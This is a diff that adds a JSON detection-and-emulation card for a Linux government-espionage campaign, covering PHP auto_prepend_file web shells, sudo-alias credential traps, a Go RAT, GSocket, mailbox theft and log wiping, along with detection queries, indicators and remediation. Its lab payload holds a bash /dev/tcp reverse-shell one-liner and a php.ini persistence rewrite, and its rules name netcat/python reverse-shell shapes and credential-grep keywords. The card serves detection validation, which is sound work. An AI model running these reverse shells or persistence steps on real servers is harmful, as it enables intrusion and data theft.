@@ -1,0 +1,696 @@
+{
+  "id": "TTP-2026-0183",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-10-27T00:00:00+00:00",
+    "updated_at": "2026-10-27T00:00:00+00:00",
+    "authors": [
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "plane-analytics",
+      "plane-edr",
+      "plane-ndr",
+      "actor-cl-unk-1211",
+      "malware-sysgorat",
+      "unit42",
+      "stitched-chain",
+      "web-shell",
+      "php-auto-prepend",
+      "credential-harvesting",
+      "reverse-shell",
+      "gsocket",
+      "mailbox-collection",
+      "anti-forensics",
+      "linux",
+      "ai-generated-payloads",
+      "severity-high"
+    ],
+    "source_refs": [
+      "SRC-UNIT42",
+      "SRC-MITRE-ATTACK"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": false,
+      "platforms": [
+        "linux"
+      ],
+      "estimated_runtime_seconds": 600,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "CL-UNK-1211 AI-Driven Linux Government Espionage - Web Shell to Mailbox Theft, Endpoint plus NGFW Stitch (T1505.003 / T1546.004 / T1114.001)",
+    "summary": "CL-UNK-1211 hit government Linux web servers with AI-written payloads: auto_prepend_file web shells, a sudo-alias .bashrc trap, SysGoRAT, reverse shells, GSocket, Maildir theft and log wiping. Validates that the endpoint leg and the NGFW leg land on one host and stitch into one incident enriched as the actor.",
+    "description": "The chain replays the report's Linux tradecraft on a lab host under www-data lineage (lab copies of php.ini, .bashrc, systemd/cron and qmail trees under /tmp/cortexsim-mp-024; reverse shells only to the operator's STAGE_HOST) and emits two synthetic NGFW records that carry the run host's IP, hostname and user in-band: a WildFire threat log naming the published gs-netcat SHA-256, and an EAL beacon to the published SysGoRAT default C2 IP. Report domains are resolved once through the operator-named lab resolver. The report describes no cloud control-plane activity, so the chain has two legs (endpoint + network). The pkill against Cortex XDR processes that the report describes is deliberately replaced by the discovery half (pgrep) only.",
+    "severity": "high",
+    "confidence": "high"
+  },
+  "threat_context": {
+    "actors": [
+      {
+        "name": "CL-UNK-1211",
+        "aliases": []
+      }
+    ],
+    "campaigns": [
+      "CL-UNK-1211 AI-assisted espionage against government Linux infrastructure (Oct 2025 - Apr 2026)"
+    ],
+    "malware_families": [
+      {
+        "name": "SysGoRAT"
+      },
+      {
+        "name": "GSocket (gs-netcat)"
+      }
+    ],
+    "industries_targeted": [
+      "government"
+    ],
+    "first_observed": "2025-10-01"
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1505",
+        "subtechnique_id": "T1505.003",
+        "name": "Server Software Component: Web Shell",
+        "tactic_ids": [
+          "TA0003"
+        ],
+        "tactic_names": [
+          "Persistence"
+        ]
+      },
+      {
+        "technique_id": "T1546",
+        "subtechnique_id": "T1546.004",
+        "name": "Event Triggered Execution: Unix Shell Configuration Modification",
+        "tactic_ids": [
+          "TA0003",
+          "TA0004"
+        ],
+        "tactic_names": [
+          "Persistence",
+          "Privilege Escalation"
+        ]
+      },
+      {
+        "technique_id": "T1552",
+        "subtechnique_id": "T1552.001",
+        "name": "Unsecured Credentials: Credentials In Files",
+        "tactic_ids": [
+          "TA0006"
+        ],
+        "tactic_names": [
+          "Credential Access"
+        ]
+      },
+      {
+        "technique_id": "T1543",
+        "subtechnique_id": "T1543.002",
+        "name": "Create or Modify System Process: Systemd Service",
+        "tactic_ids": [
+          "TA0003"
+        ],
+        "tactic_names": [
+          "Persistence"
+        ]
+      },
+      {
+        "technique_id": "T1053",
+        "subtechnique_id": "T1053.003",
+        "name": "Scheduled Task/Job: Cron",
+        "tactic_ids": [
+          "TA0003"
+        ],
+        "tactic_names": [
+          "Persistence"
+        ]
+      },
+      {
+        "technique_id": "T1036",
+        "subtechnique_id": "T1036.004",
+        "name": "Masquerading: Masquerade Task or Service",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.004",
+        "name": "Command and Scripting Interpreter: Unix Shell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1071",
+        "subtechnique_id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1090",
+        "name": "Proxy",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1114",
+        "subtechnique_id": "T1114.001",
+        "name": "Email Collection: Local Email Collection",
+        "tactic_ids": [
+          "TA0009"
+        ],
+        "tactic_names": [
+          "Collection"
+        ]
+      },
+      {
+        "technique_id": "T1560",
+        "subtechnique_id": "T1560.001",
+        "name": "Archive Collected Data: Archive via Utility",
+        "tactic_ids": [
+          "TA0009"
+        ],
+        "tactic_names": [
+          "Collection"
+        ]
+      },
+      {
+        "technique_id": "T1567",
+        "name": "Exfiltration Over Web Service",
+        "tactic_ids": [
+          "TA0010"
+        ],
+        "tactic_names": [
+          "Exfiltration"
+        ]
+      },
+      {
+        "technique_id": "T1070",
+        "subtechnique_id": "T1070.003",
+        "name": "Indicator Removal: Clear Command History",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1070",
+        "subtechnique_id": "T1070.006",
+        "name": "Indicator Removal: Timestomp",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1070",
+        "subtechnique_id": "T1070.002",
+        "name": "Indicator Removal: Clear Linux or Mac System Logs",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1518",
+        "subtechnique_id": "T1518.001",
+        "name": "Software Discovery: Security Software Discovery",
+        "tactic_ids": [
+          "TA0007"
+        ],
+        "tactic_names": [
+          "Discovery"
+        ]
+      }
+    ],
+    "kill_chain_phase": "actions-on-objectives",
+    "data_sources": [
+      "Process: Process Creation",
+      "File: File Modification",
+      "File: File Creation",
+      "Command: Command Execution",
+      "Network Traffic: Network Connection Creation",
+      "Network Traffic: Network Traffic Content"
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "framework_reference_id": "SIM-MP-024 - CL-UNK-1211 web shell to mailbox theft, endpoint plus NGFW stitched chain",
+    "privilege_required": "user",
+    "prerequisites": [
+      {
+        "description": "A Linux lab host enrolled with the Cortex XDR agent and a www-data account; the run writes only under /tmp/cortexsim-mp-024 and /dev/shm/.gs-cortexsim-mp024.",
+        "check_command": "id www-data"
+      },
+      {
+        "description": "STAGE_HOST (default 127.0.0.1) is a host the operator controls; the reverse-shell shapes connect only there.",
+        "check_command": "echo \"${STAGE_HOST:-127.0.0.1}\""
+      },
+      {
+        "description": "LAB_RESOLVER names the resolver the report-domain lookups use; the operator confirms it may forward to the internet or keeps it sinkholed.",
+        "check_command": "echo \"${LAB_RESOLVER:-127.0.0.53}\""
+      },
+      {
+        "description": "COLLECTOR_URL points at the tenant's HTTP log collector / Broker VM so the two NGFW records ingest into panw_ngfw_threat_raw and panw_ngfw_traffic_raw."
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# Lab-only replay of the CL-UNK-1211 Linux chain; the scenario YAML (SIM-MP-024) holds the per-step commands.\n# Every write lands under /tmp/cortexsim-mp-024 or /dev/shm/.gs-cortexsim-mp024; reverse shells reach only $STAGE_HOST;\n# the two network records are synthetic NGFW logs POSTed to the operator's collector with the run host's identity in-band.\nL=/tmp/cortexsim-mp-024\nmkdir -p \"$L/etc/php/8.1/fpm\" \"$L/usr/lib/php\"\nprintf 'auto_prepend_file =\\n' > \"$L/etc/php/8.1/fpm/php.ini\"\nsed -i \"s#^auto_prepend_file =.*#auto_prepend_file = $L/usr/lib/php/plesk_sys_driver.php#\" \"$L/etc/php/8.1/fpm/php.ini\"\ntimeout 3 bash -c \"bash -i >& /dev/tcp/${STAGE_HOST:-127.0.0.1}/${STAGE_PORT:-4444} 0>&1\" 2>/dev/null || true",
+      "input_variables": [
+        {
+          "name": "STAGE_HOST",
+          "type": "string",
+          "default": "127.0.0.1",
+          "description": "Operator-controlled host the reverse-shell shapes connect to."
+        },
+        {
+          "name": "LAB_RESOLVER",
+          "type": "string",
+          "default": "127.0.0.53",
+          "description": "Resolver the report-domain DNS lookups are sent to."
+        },
+        {
+          "name": "COLLECTOR_URL",
+          "type": "string",
+          "default": "https://collector.cortexsim-canary.invalid/ngfw/eal/events",
+          "description": "HTTP collector the synthetic NGFW records are POSTed to."
+        }
+      ],
+      "timeout_seconds": 600
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "file",
+        "description": "php.ini copies under etc/php and opt/plesk/php rewritten with auto_prepend_file pointing at plesk_sys_driver.php.",
+        "expected_value": "auto_prepend_file = /tmp/cortexsim-mp-024/usr/lib/php/plesk_sys_driver.php"
+      },
+      {
+        "artifact_type": "process",
+        "description": "bash -i to /dev/tcp, mkfifo + nc and python3 socket/dup2 reverse-shell process starts under www-data.",
+        "expected_value": "action_process_image_command_line contains \"/dev/tcp/\""
+      },
+      {
+        "artifact_type": "dns-query",
+        "description": "One query each for the four report domains, sent to LAB_RESOLVER.",
+        "expected_value": "dns_query_name in (magento.ink, solidmonpe.com, wibu-bau-bawang.online, beraskencur.site)"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Synthetic NGFW EAL traffic record from the run host to the SysGoRAT default C2 and a WildFire threat record naming the gs-netcat SHA-256.",
+        "expected_value": "panw_ngfw_traffic_raw dst = 104.194.158.65 and panw_ngfw_threat_raw filedigest = d94f75a7..."
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "rm -rf /tmp/cortexsim-mp-024 /dev/shm/.gs-cortexsim-mp024 /tmp/mp-024-*.yml"
+    }
+  },
+  "detections": {
+    "iocs": [
+      {
+        "ioc_type": "ipv4",
+        "value": "104.194.158.65",
+        "context": "SysGoRAT hardcoded default WebSocket C2 (wss://<addr>/ws on 443), report SysGoRAT Malware section and IOC list. Carried only as dst on the synthetic NGFW EAL beacon record (step-07); no session to it is ever opened.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/ai-campaign-targets-linux-infrastructure/",
+        "published": "2026-10-15",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "d94f75a70b5cabaf786ac57177ed841732e62bdcc9a29e06e5b41d9be567bcfa",
+        "context": "GSocket reverse shell (gs-netcat) per the report IOC list. Carried only as filedigest on the synthetic NGFW WildFire threat record (step-06); the binary is never fetched.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/ai-campaign-targets-linux-infrastructure/",
+        "published": "2026-10-15",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "domain",
+        "value": "magento.ink",
+        "context": "CL-UNK-1211 domain from the report IOC list. One DNS query through the operator-named lab resolver (step-07); no session opened.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/ai-campaign-targets-linux-infrastructure/",
+        "published": "2026-10-15",
+        "safe_form": "dns_lookup"
+      },
+      {
+        "ioc_type": "domain",
+        "value": "solidmonpe.com",
+        "context": "CL-UNK-1211 domain from the report IOC list. One DNS query through the operator-named lab resolver (step-07); no session opened.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/ai-campaign-targets-linux-infrastructure/",
+        "published": "2026-10-15",
+        "safe_form": "dns_lookup"
+      },
+      {
+        "ioc_type": "domain",
+        "value": "wibu-bau-bawang.online",
+        "context": "CL-UNK-1211 domain from the report IOC list. One DNS query through the operator-named lab resolver (step-07); no session opened.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/ai-campaign-targets-linux-infrastructure/",
+        "published": "2026-10-15",
+        "safe_form": "dns_lookup"
+      },
+      {
+        "ioc_type": "domain",
+        "value": "beraskencur.site",
+        "context": "CL-UNK-1211 domain from the report IOC list. One DNS query through the operator-named lab resolver (step-07); no session opened.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/ai-campaign-targets-linux-infrastructure/",
+        "published": "2026-10-15",
+        "safe_form": "dns_lookup"
+      }
+    ],
+    "biocs": [
+      {
+        "name": "MP-024 PHP auto_prepend_file Hijack Across PHP and Plesk Configurations",
+        "description": "A web-server-lineage process (php-fpm / www-data causality) rewrites the auto_prepend_file directive in php.ini files under /etc/php/ and /opt/plesk/php/ so a dropped PHP file (plesk_sys_driver.php) executes before every PHP script - the CL-UNK-1211 global PHP-configuration persistence.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_WRITE, ENUM.FILE_RENAME)\n| filter action_file_name = \"php.ini\" and (action_file_path contains \"/etc/php/\" or action_file_path contains \"/opt/plesk/php/\")\n| filter actor_effective_username = \"www-data\" or causality_actor_process_image_name in (\"php-fpm\", \"php-fpm8.1\", \"apache2\", \"nginx\")\n| comp count() as ini_writes, values(action_file_path) as ini_paths by agent_hostname, causality_actor_process_image_name, causality_id\n| filter ini_writes >= 2",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1505.003",
+          "T1546"
+        ]
+      },
+      {
+        "name": "MP-024 Shell Profile Hijack Aliasing sudo to a Credential Log",
+        "description": "A .bashrc is rewritten with an alias that wraps sudo and appends to a log file named to mimic SolarWinds (Solarwinds.StatusLog.txt) - the CL-UNK-1211 sudo-prompt credential interception. The lab copy logs a fixed redacted token, never a typed password.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.FILE and event_sub_type = ENUM.FILE_WRITE\n| filter action_file_name = \".bashrc\" or action_file_name = \"Solarwinds.StatusLog.txt\"\n| filter actor_effective_username = \"www-data\" or causality_actor_process_image_name in (\"php-fpm\", \"php-fpm8.1\")\n| comp count() as profile_writes, values(action_file_name) as files by agent_hostname, causality_id\n| filter profile_writes >= 2",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1546.004",
+          "T1056"
+        ]
+      },
+      {
+        "name": "MP-024 Cleartext Password Sweep of PHP Web and Shell History Files",
+        "description": "grep run from web-server lineage recursively over /etc/php, /var/www and shell history for smtp_pass / db_password / mail_password strings - the report's cleartext credential search.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"grep\"\n| filter action_process_image_command_line ~= \"(?i)(smtp_pass|db_password|mail_password)\"\n| filter actor_effective_username = \"www-data\"\n| fields agent_hostname, action_process_image_command_line, causality_actor_process_image_name, causality_id",
+        "severity": "medium",
+        "mitre_technique_ids": [
+          "T1552.001"
+        ]
+      },
+      {
+        "name": "MP-024 Masqueraded Go RAT Persistence via sys-update systemd Unit and Five-Minute Cron",
+        "description": "A binary executed from a non-package path under a benign name (sys-control-client / pip2.7) plus a sys-update.service unit and a */5 cron entry pointing at /usr/local/bin/sys-control-client, with touch -t timestomping - the SysGoRAT persist sub-actions from the report appendix.",
+        "logic": "dataset = xdr_data\n| filter (event_type = ENUM.PROCESS and action_process_image_name in (\"sys-control-client\", \"pip2.7\", \"ea_install\", \"semanage\") and action_process_image_path not contains \"/usr/sbin/\") or (event_type = ENUM.FILE and action_file_name in (\"sys-update.service\", \"www-data\") and (action_file_path contains \"systemd/system\" or action_file_path contains \"spool/cron\"))\n| comp count() as persist_signals, values(action_process_image_name) as procs, values(action_file_name) as files by agent_hostname, causality_id\n| filter persist_signals >= 2",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1543.002",
+          "T1053.003",
+          "T1036.005",
+          "T1070.006"
+        ]
+      },
+      {
+        "name": "MP-024 Bash dev-tcp, Named-Pipe and Python Socket Reverse Shells from Web-Server Lineage",
+        "description": "Three in-memory reverse-shell shapes from the report under www-data lineage: bash -i redirected to /dev/tcp, a mkfifo + nc named-pipe loop, and python3 socket.connect + os.dup2 + subprocess spawning /bin/bash. The lab run targets the operator's own STAGE_HOST.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_command_line contains \"/dev/tcp/\" or action_process_image_command_line contains \"mkfifo\" or (action_process_image_name in (\"python3\", \"python\") and action_process_image_command_line contains \"socket\" and action_process_image_command_line contains \"dup2\")\n| filter actor_effective_username = \"www-data\"\n| comp count_distinct(action_process_image_command_line) as shell_shapes by agent_hostname, causality_id\n| filter shell_shapes >= 2",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1059.004",
+          "T1059.006"
+        ]
+      },
+      {
+        "name": "MP-024 GSocket Relay Binary Masquerading as a Kernel Thread from dev-shm",
+        "description": "A process image under /dev/shm/.gs-* runs with argv[0] [kcached] (a fake kernel thread name), GSOCKET_ARGS passed via the environment and HISTFILE=/dev/null - the report's gs-netcat / gs-dbus tradecraft.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_path contains \"/dev/shm/.gs-\" or action_process_image_command_line contains \"[kcached]\"\n| fields agent_hostname, action_process_image_path, action_process_image_command_line, actor_effective_username, causality_id",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1036.004",
+          "T1090"
+        ]
+      },
+      {
+        "name": "MP-024 Qmail Maildir Enumeration and Mailbox Archive Staging",
+        "description": "Web-server lineage walks /var/qmail/mailnames/*/*/Maildir/cur, greps mail headers for social-media sender and login-code keywords (search_social behaviour) and runs a zip_mails.sh that tars each user's Maildir - the report's mailbox collection and staging.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_command_line contains \"qmail/mailnames\" or action_process_image_command_line contains \"zip_mails.sh\" or (action_process_image_name = \"tar\" and action_process_image_command_line contains \"Maildir\")\n| comp count() as mail_ops by agent_hostname, actor_effective_username, causality_id\n| filter mail_ops >= 2",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1114.001",
+          "T1560.001"
+        ]
+      },
+      {
+        "name": "MP-024 Endpoint-Agent Process Discovery and Log Wipe by Web-Server Lineage",
+        "description": "pgrep for Cortex XDR agent process names followed by truncation of auth / mail / web / syslog files, touch -t timestomping, a write-execute-delete one-line script and a planted RedTeamOps2025 marker - the CL-UNK-1211 anti-forensics sequence. The lab run never sends a kill signal and only truncates lab copies of the logs.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter (action_process_image_name = \"pgrep\" and action_process_image_command_line ~= \"(?i)(traps|pmd|cortex|xdr)\") or (action_process_image_name in (\"truncate\", \"shred\") and action_process_image_command_line contains \"log\") or (action_process_image_name = \"touch\" and action_process_image_command_line contains \"-t \")\n| comp count_distinct(action_process_image_name) as evasion_tools by agent_hostname, causality_id\n| filter evasion_tools >= 2",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1518.001",
+          "T1070.002",
+          "T1070.004",
+          "T1070.006"
+        ]
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "MP-024 Uncommon Attempt to Clear Shell History",
+        "description": "A web-server-lineage shell empties .bash_history, unsets HISTFILE and runs history -c - the Cortex XDR Analytics detector the report shows firing on CL-UNK-1211 (Figure 18). Behavioral: rare for this host and user against the learned baseline.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.FILE and action_file_name = \".bash_history\" and event_sub_type in (ENUM.FILE_WRITE, ENUM.FILE_REMOVE)\n| filter action_file_size = 0 or event_sub_type = ENUM.FILE_REMOVE\n| comp count() as history_clears by agent_hostname, actor_effective_username, causality_actor_process_image_name, causality_id\n| filter history_clears >= 1",
+        "severity": "medium",
+        "mitre_technique_ids": [
+          "T1070.003"
+        ],
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "Learned per-host/per-user history-file baseline -> a shell descended from the php-fpm web-server CGO clears its own history, anchored on causality_id so it joins the same chain as the web-shell and reverse-shell alerts."
+      },
+      {
+        "name": "MP-024 Abnormal Recurring WebSocket Beacon to SysGoRAT C2",
+        "description": "The run host (src / endpoint_device_name) makes a recurring burst of small ssl/443 sessions to 104.194.158.65 - the SysGoRAT default WebSocket C2 - a destination rare across the fleet. Fires on the recurring-cadence plus rarity deviation; Unit 42 enrichment of the destination IP names the actor.",
+        "logic": "dataset = panw_ngfw_traffic_raw\n| filter log_source_type = \"eal\" and app = \"ssl\" and dst_port = 443\n| comp count() as recurring_sessions, avg(bytes_sent) as avg_bytes by src, endpoint_device_name, dst, url_domain\n| filter recurring_sessions >= 6 and avg_bytes < 8192\n| fields src, endpoint_device_name, dst, url_domain, recurring_sessions, avg_bytes",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1071.001"
+        ],
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "Learned host NGFW EAL egress baseline -> recurring small sessions to a fleet-rare destination, anchored to the same endpoint_device_name the endpoint alerts carry."
+      },
+      {
+        "name": "MP-024 Massive Mailbox-Archive Upload to a Rare Storage Domain",
+        "description": "After the Maildir archives are staged, the same run host sends an anomalously large outbound volume to a fleet-rare storage domain - the report's file-hosting exfiltration attempt. The destination stays the emitter preset because the report names legitimate file-hosting services, not actor indicators; this alert is un-enrichable and stitches on the host only.",
+        "logic": "dataset = panw_ngfw_traffic_raw\n| filter log_source_type = \"eal\"\n| comp sum(bytes_sent) as total_sent, count() as sessions by src, endpoint_device_name, url_domain\n| filter total_sent >= 5368709120\n| fields src, endpoint_device_name, url_domain, total_sent, sessions",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1567",
+          "T1048"
+        ],
+        "behavioral_profile": "statistical",
+        "causality_anchor": "Learned per-host outbound-volume baseline -> a massive upload from the host that just archived mailboxes, anchored to endpoint_device_name."
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "MP-024 auto_prepend_file Hijack Landed in xdr_data",
+        "query": "dataset = xdr_data\n| filter _time > to_timestamp(current_time() - 3600)\n| filter event_type = ENUM.FILE and action_file_name in (\"php.ini\", \"plesk_sys_driver.php\")\n| comp count() as php_file_events by agent_hostname, actor_effective_username\n| fields agent_hostname, actor_effective_username, php_file_events",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "MP-024 GSocket WildFire Threat Record Landed in panw_ngfw_threat_raw",
+        "query": "dataset = panw_ngfw_threat_raw\n| filter _time > to_timestamp(current_time() - 3600)\n| filter filedigest = \"d94f75a70b5cabaf786ac57177ed841732e62bdcc9a29e06e5b41d9be567bcfa\"\n| fields src, endpoint_device_name, user, filename, filedigest, verdict, action",
+        "expected_rows_min": 1,
+        "dataset": "panw_ngfw_threat_raw"
+      },
+      {
+        "purpose": "hunt",
+        "name": "MP-024 CL-UNK-1211 Domain Lookups from the Run Host",
+        "query": "dataset = xdr_data\n| filter _time > to_timestamp(current_time() - 3600)\n| filter event_type = ENUM.NETWORK and dns_query_name in (\"magento.ink\", \"solidmonpe.com\", \"wibu-bau-bawang.online\", \"beraskencur.site\")\n| comp count() as lookups, values(dns_query_name) as domains by agent_hostname\n| fields agent_hostname, lookups, domains",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "MP-024 Endpoint and Network Legs Share One Host",
+        "query": "dataset = panw_ngfw_traffic_raw\n| filter _time > to_timestamp(current_time() - 3600)\n| filter dst = \"104.194.158.65\"\n| comp count() as c2_sessions by endpoint_device_name\n| join type = inner (dataset = xdr_data | filter _time > to_timestamp(current_time() - 3600) | filter actor_effective_username = \"www-data\" | comp count() as endpoint_events by agent_hostname) as ep ep.agent_hostname = endpoint_device_name\n| fields endpoint_device_name, c2_sessions, endpoint_events",
+        "expected_rows_min": 1,
+        "dataset": "panw_ngfw_traffic_raw"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "name": "CL-UNK-1211 Linux Web-Server Espionage Chain - Endpoint plus NGFW on One Host",
+        "rule_id": "CR-MP-0024",
+        "logic": "BIOC(MP-024 PHP auto_prepend_file Hijack Across PHP and Plesk Configurations) AND BIOC(MP-024 Bash dev-tcp, Named-Pipe and Python Socket Reverse Shells from Web-Server Lineage) AND (ABIOC(MP-024 Abnormal Recurring WebSocket Beacon to SysGoRAT C2) OR IOC(104.194.158.65) OR IOC(d94f75a70b5cabaf786ac57177ed841732e62bdcc9a29e06e5b41d9be567bcfa)) AND (BIOC(MP-024 Qmail Maildir Enumeration and Mailbox Archive Staging) OR ABIOC(MP-024 Massive Mailbox-Archive Upload to a Rare Storage Domain)) AND (ABIOC(MP-024 Uncommon Attempt to Clear Shell History) OR BIOC(MP-024 Endpoint-Agent Process Discovery and Log Wipe by Web-Server Lineage)) within 1800s on the same host (src_host: xdr_data agent_hostname = NGFW endpoint_device_name, which every synthetic NGFW record carries in-band from the run host) -> one CL-UNK-1211 incident spanning the endpoint and network legs, enriched as the actor by the Unit 42 IP, hash and domain indicators."
+      }
+    ],
+    "analytics_modules": [
+      {
+        "module": "Cortex XDR Analytics Engine - EDR Linux Evasion (Uncommon attempt to clear shell history)",
+        "validated": false,
+        "note": "The report shows this detector firing on CL-UNK-1211; the card models it as an ABIOC body. Not yet observed on a tenant (tenant-verified 0)."
+      }
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "bioc",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-XDR-MP024-01"
+        ],
+        "license_required": "pro",
+        "evidence_query": "dataset = xdr_data | filter actor_effective_username = \"www-data\" | filter action_file_name in (\"php.ini\", \".bashrc\", \"sys-update.service\") | comp count() by agent_hostname"
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "correlation",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "CR-MP-0024"
+        ],
+        "license_required": "enterprise",
+        "evidence_query": "CR-MP-0024 raises one incident whose alerts include endpoint BIOCs on agent_hostname H and NGFW records whose endpoint_device_name is H."
+      },
+      {
+        "module": "advanced-wildfire",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-WF-MP024-01"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = panw_ngfw_threat_raw | filter filedigest = \"d94f75a70b5cabaf786ac57177ed841732e62bdcc9a29e06e5b41d9be567bcfa\""
+      },
+      {
+        "module": "advanced-dns-security",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-DNS-MP024-01"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "Lookups of magento.ink / solidmonpe.com / wibu-bau-bawang.online / beraskencur.site from the run host are categorised malicious."
+      }
+    ],
+    "threat_scenarios": [
+      {
+        "threat_scenario_id": "TS-MP-024",
+        "name": "CL-UNK-1211 Endpoint plus Network Stitch on One Linux Web Server",
+        "description": "Every endpoint behaviour and both synthetic NGFW records land on one host and stitch into one incident enriched as CL-UNK-1211.",
+        "threat_steps": [
+          {
+            "threat_step_id": "TS-MP-024A",
+            "objective": "Endpoint leg: the web-shell persistence, credential trap, RAT persistence, reverse shells, GSocket masquerade, mailbox staging and anti-forensics BIOCs/ABIOCs fire under the php-fpm / www-data causality.",
+            "steps": [
+              "Run steps 01-05, 08 and 10 on the lab host.",
+              "Open the causality view for the host."
+            ],
+            "success_criteria": [
+              "At least five of the eight MP-024 BIOCs fire on the host.",
+              "The shell-history ABIOC fires."
+            ],
+            "expected_score_weight": 0.4
+          },
+          {
+            "threat_step_id": "TS-MP-024B",
+            "objective": "Network leg: the WildFire threat record, the C2 beacon record and the mailbox upload record ingest with the run host's endpoint_device_name and match the Unit 42 hash, IP and domain indicators.",
+            "steps": [
+              "Run steps 06, 07 and 09 with COLLECTOR_URL set.",
+              "Query panw_ngfw_threat_raw and panw_ngfw_traffic_raw for the run host."
+            ],
+            "success_criteria": [
+              "Both NGFW datasets show records whose endpoint_device_name equals the endpoint agent_hostname.",
+              "IOC enrichment names the published IP and hash."
+            ],
+            "expected_score_weight": 0.3
+          },
+          {
+            "threat_step_id": "TS-MP-024C",
+            "objective": "CR-MP-0024 fuses both legs into one incident on the shared host.",
+            "steps": [
+              "Run step 11.",
+              "Open the incident list for the window."
+            ],
+            "success_criteria": [
+              "Exactly one incident contains alerts from both the endpoint and the NGFW sources for the host."
+            ],
+            "expected_score_weight": 0.3
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Lock php.ini under /etc/php and /opt/plesk/php to root ownership and monitor auto_prepend_file changes; web-server accounts should never be able to rewrite PHP configuration.",
+      "Deny outbound connections from web-server accounts except to named dependencies; reverse shells and GSocket relays need egress.",
+      "Keep Cortex XDR agent tamper protection on; the report shows it stopping the pkill attempts."
+    ],
+    "detection_engineering": [
+      "Alert on .bashrc writes that add a sudo alias, and on any process image under /dev/shm.",
+      "Join NGFW endpoint_device_name to xdr_data agent_hostname so network and endpoint alerts group into one incident."
+    ],
+    "response_playbook": "XSOAR-PB-LinuxWebShellEspionageContainment-v1"
+  },
+  "references": [
+    {
